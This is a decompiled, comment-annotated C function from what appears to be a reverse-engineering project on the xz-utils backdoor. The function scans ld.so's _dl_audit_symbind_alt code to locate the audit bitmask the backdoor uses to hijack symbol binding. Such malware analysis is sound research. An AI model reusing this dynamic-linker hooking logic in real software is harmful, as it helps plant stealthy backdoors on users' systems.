// /home/kali/xzre-ghidra/xzregh/104EE0_find_l_audit_any_plt_mask_via_symbind_alt.c
// Function: find_l_audit_any_plt_mask_via_symbind_alt @ 0x104EE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_l_audit_any_plt_mask_via_symbind_alt(backdoor_data_handle_t * data, ptrdiff_t libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Primes an `instruction_search_ctx_t` before delegating to `find_l_audit_any_plt_mask_and_slot`. After wiping
 * the decoder/search contexts it allocates temporary libc trampolines, sweeps `_dl_audit_symbind_alt` for a REX.W LEA whose
 * displacement matches the caller-provided `libname_offset`, records which registers hold the pointer vs. AND mask, and then hands
 * the populated search context to the helper. A hit stores both the displacement and mask in `hooks->ldso_ctx`; a miss either
 * means `_dl_audit_symbind_alt` never emitted the pattern or the bitmask was already latched.
 */

#include "xzre_types.h"

BOOL find_l_audit_any_plt_mask_via_symbind_alt
               (backdoor_data_handle_t *data,ptrdiff_t libname_offset,backdoor_hooks_data_t *hooks,
               imported_funcs_t *imported_funcs)

{
  libc_imports_t *libc_imports;
  instruction_register_bitmap_t output_register_snapshot;
  u64 decoded_insn_size;
  BOOL telemetry_ok;
  lzma_allocator *libc_allocator;
  pfn_write_t write_stub_alloc;
  pfn_pselect_t pselect_stub_alloc;
  long wipe_idx;
  uchar l_name_reg_index;
  dl_audit_symbind_alt_fn audit_func_cursor;
  u8 *lea_operand_disp;
  dasm_ctx_t *insn_ctx_wipe_cursor;
  instruction_search_ctx_t *search_ctx_wipe_cursor;
  u32 *search_ctx_zero_cursor;
  uchar mask_reg_index;
  dl_audit_symbind_alt_fn audit_func_end;
  u8 wipe_stride;
  instruction_register_bitmap_t mask_register_bitmap;
  instruction_register_bitmap_t output_register_bitmap;
  instruction_search_ctx_t search_ctx;
  dasm_ctx_t insn_ctx;
  
  wipe_stride = 0;
  telemetry_ok = secret_data_append_bits_from_call_site((secret_data_shift_cursor_t)0x85,0x12,8,FALSE);
  if (telemetry_ok != FALSE) {
    libc_imports = imported_funcs->libc;
    // AutoDoc: Reset the decoder arena before scanning `_dl_audit_symbind_alt` so no stale prefix flags leak into the LEA detector.
    insn_ctx_wipe_cursor = &insn_ctx;
    for (wipe_idx = 0x16; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
      *(u32 *)&insn_ctx_wipe_cursor->instruction = 0;
      insn_ctx_wipe_cursor = (dasm_ctx_t *)((long)insn_ctx_wipe_cursor + 4);
    }
    mask_register_bitmap.raw_value = 0;
    output_register_bitmap.raw_value = 0;
    libc_allocator = get_fake_lzma_allocator();
    libc_allocator->opaque = data->cached_elf_handles->libc;
    write_stub_alloc = (pfn_write_t)lzma_alloc(0x380,libc_allocator);
    output_register_snapshot = output_register_bitmap;
    libc_imports->write = write_stub_alloc;
    if (write_stub_alloc != (pfn_write_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    audit_func_cursor = (hooks->ldso_ctx)._dl_audit_symbind_alt;
    mask_register_bitmap.fields.reg_index = 0xff;
    mask_register_bitmap.raw_value = CONCAT22(mask_register_bitmap.words.high_word,mask_register_bitmap.fields.allowed_regs) | 0x80;
    output_register_bitmap.fields.allowed_regs = output_register_bitmap.fields.allowed_regs | 2;
    audit_func_end = audit_func_cursor + (hooks->ldso_ctx)._dl_audit_symbind_alt__size;
    output_register_bitmap.fields.reserved = output_register_snapshot.fields.reserved;
    output_register_bitmap.fields.reg_index = 0xff;
    pselect_stub_alloc = (pfn_pselect_t)lzma_alloc(0x690,libc_allocator);
    libc_imports->pselect = pselect_stub_alloc;
    if (pselect_stub_alloc != (pfn_pselect_t)0x0) {
      libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
    }
    while ((audit_func_cursor < audit_func_end &&
           (telemetry_ok = x86_decode_instruction(&insn_ctx,(u8 *)audit_func_cursor,(u8 *)audit_func_end),
           decoded_insn_size = insn_ctx.instruction_size, telemetry_ok != FALSE))) {
      if ((insn_ctx.opcode_window.opcode_window_dword == X86_OPCODE_2B_MOVZX_RM8) &&
         ((((ushort)insn_ctx.prefix.flags_u32 & 0x140) == 0x140 &&
          ((byte)(insn_ctx.prefix.modrm_bytes.modrm_mod - 1) < 2)))) {
        mask_reg_index = 0;
        if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
          l_name_reg_index = 0;
          if ((((insn_ctx.prefix.flags_u32 & 0x1040) != 0) &&
              (l_name_reg_index = insn_ctx.prefix.decoded.flags2 & DF2_IMM64,
              (insn_ctx.prefix.flags_u32 & 0x1000) != 0)) &&
             (l_name_reg_index = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & 0x20) != 0)) {
            l_name_reg_index = insn_ctx.mov_imm_reg_index | (insn_ctx.prefix.modrm_bytes.rex_byte & 1) << 3;
          }
        }
        else {
          l_name_reg_index = insn_ctx.prefix.decoded.flags & DF1_REX;
          if ((insn_ctx.prefix.flags_u32 & 0x20) == 0) {
            mask_reg_index = insn_ctx.prefix.modrm_bytes.modrm_rm;
            if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
              l_name_reg_index = insn_ctx.prefix.modrm_bytes.modrm_reg;
            }
          }
          else {
            mask_reg_index = insn_ctx.prefix.modrm_bytes.modrm_rm |
                     insn_ctx.prefix.modrm_bytes.rex_byte * '\b' & 8;
            l_name_reg_index = 0;
            if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
              l_name_reg_index = insn_ctx.prefix.modrm_bytes.rex_byte * '\x02' & 8 |
                      insn_ctx.prefix.modrm_bytes.modrm_reg;
            }
          }
        }
        if ((insn_ctx.prefix.flags_u32 & 0x100) != 0) {
          lea_operand_disp = (u8 *)insn_ctx.mem_disp;
          if (((uint)insn_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
            lea_operand_disp = insn_ctx.instruction + (long)(insn_ctx.mem_disp + insn_ctx.instruction_size);
          }
          // AutoDoc: Only chase LEAs whose displacement matches the expected `link_map::l_name` offset; everything else is noise.
          if ((lea_operand_disp < (ulong)libname_offset) && (lea_operand_disp != (u8 *)0x0)) {
            search_ctx_wipe_cursor = &search_ctx;
            // AutoDoc: Zero the `instruction_search_ctx_t` before seeding offsets so the bitmask helper inherits a clean cursor.
            for (wipe_idx = 0x10; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
              *(u32 *)&search_ctx_wipe_cursor->start_addr = 0;
              search_ctx_wipe_cursor = (instruction_search_ctx_t *)((long)search_ctx_wipe_cursor + 4);
            }
            // AutoDoc: Whichever register we see first becomes `output_register_to_match`; the companion bitmap is treated as the AND-mask source so they stay paired.
            if (((int)(mask_register_bitmap.raw_value & 0xffff) >> (mask_reg_index & 0x1f) & 1U) == 0) {
              if (((int)(output_register_bitmap.raw_value & 0xffff) >> (mask_reg_index & 0x1f) & 1U) == 0)
              goto LAB_00104fd8;
              output_register_bitmap.fields.reg_index = l_name_reg_index;
              search_ctx_zero_cursor = &search_ctx.offset_to_match.dwords.reserved;
              for (wipe_idx = 7; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
                *search_ctx_zero_cursor = 0;
                search_ctx_zero_cursor = search_ctx_zero_cursor + 1;
              }
              search_ctx.output_register_to_match = &output_register_bitmap;
              search_ctx.output_register = &mask_register_bitmap;
            }
            else {
              mask_register_bitmap.fields.reg_index = l_name_reg_index;
              search_ctx_zero_cursor = &search_ctx.offset_to_match.dwords.reserved;
              for (wipe_idx = 7; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
                *search_ctx_zero_cursor = 0;
                search_ctx_zero_cursor = search_ctx_zero_cursor + 1;
              }
              search_ctx.output_register_to_match = &mask_register_bitmap;
              search_ctx.output_register = &output_register_bitmap;
            }
            // AutoDoc: Seed the instruction search context immediately after the LEA and hand it to `find_l_audit_any_plt_mask_and_slot` to capture the mask bit + slot offset.
            search_ctx.start_addr = (u8 *)(audit_func_cursor + decoded_insn_size);
            search_ctx.end_addr = (u8 *)audit_func_end;
            search_ctx.offset_to_match.dwords.offset = (u32)lea_operand_disp;
            search_ctx.hooks = hooks;
            search_ctx.imported_funcs = imported_funcs;
            telemetry_ok = find_l_audit_any_plt_mask_and_slot(data,&search_ctx);
            if (telemetry_ok != FALSE) {
              return TRUE;
            }
            if (search_ctx.result != FALSE) {
              return FALSE;
            }
          }
        }
      }
LAB_00104fd8:
      audit_func_cursor = audit_func_cursor + insn_ctx.instruction_size;
    }
  }
  return FALSE;
}

